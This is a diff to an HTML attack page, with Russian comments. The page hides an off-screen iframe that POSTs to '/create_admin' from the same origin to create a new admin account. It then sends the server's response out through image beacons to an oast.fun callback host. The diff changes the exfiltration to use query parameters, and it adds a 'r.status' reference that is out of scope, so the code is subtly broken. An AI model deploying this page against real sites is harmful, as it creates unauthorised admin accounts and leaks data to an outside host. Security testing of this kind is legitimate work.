@@ -2,6 +2,8 @@
 <html>
 <body>
 <script>
+const WEBHOOK = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+
 // Создаем iframe с кодом, который сделает запрос С ТОГО ЖЕ ORIGIN
 const iframe = document.createElement('iframe');
 iframe.style.cssText = 'width:0;height:0;border:0;position:absolute;left:-9999px;';
@@ -20,14 +22,15 @@ iframe.srcdoc = `
         fetch('/create_admin', {
             method: 'POST',
             headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'new_admin_login=srcdoc_test'
+            body: 'new_admin_login=srcdoc_test_' + Date.now()
         })
         .then(r => r.text())
         .then(text => {
             // Отправляем результат родителю
             window.parent.postMessage({
                 type: 'admin_response',
-                data: text.substring(0, 300)
+                status: r.status,
+                data: text.substring(0, 500)
             }, '*');
         })
         .catch(e => {
@@ -44,14 +47,16 @@ iframe.srcdoc = `
 // Слушаем сообщения от iframe
 window.addEventListener('message', (event) => {
     if (event.data && event.data.type) {
-        // Отправляем на webhook
-        const encoded = btoa(JSON.stringify(event.data)).substring(0, 40);
-        new Image().src = `https://msg-${encoded}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
+        // Отправляем на webhook В КВЕРИ ПАРАМЕТРЕ
+        const encoded = btoa(JSON.stringify(event.data));
+        new Image().src = `${WEBHOOK}/?${event.data.type}=${encodeURIComponent(encoded)}`;
     }
 });
 
 document.body.appendChild(iframe);
-new Image().src = 'https://srcdoc-loaded.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/';
+
+// Отправляем статус загрузки В КВЕРИ ПАРАМЕТРЕ
+new Image().src = `${WEBHOOK}/?status=srcdoc_loaded`;
 </script>
 </body>
 </html>
